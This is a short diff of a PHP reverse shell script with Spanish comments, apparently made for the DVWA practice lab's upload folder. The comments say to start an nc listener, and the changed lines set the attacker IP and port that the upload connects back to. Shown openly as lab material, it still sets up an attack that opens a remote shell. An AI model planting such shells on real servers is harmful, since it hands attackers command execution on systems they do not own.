@@ -5,9 +5,9 @@
     .../hackable/uploads/reverse_shell.php
     Se debe crear un listener con nc o otro comando a elección en el puerto correspondiente.
     al ingresar al path del reverse_shell script en el server, el servidor se conectara con el servidor
-    atacado para ejecutar comandos.
+    atacante para ejecutar comandos.
 */
-$ip = '192.168.100.47'; // Cambia esto por tu IP
+$ip = '192.168.1.119'; // Cambia esto por tu IP
 $port = 6969; // Cambia esto por el puerto que elijas
 
 // Inicia una conexión de socket
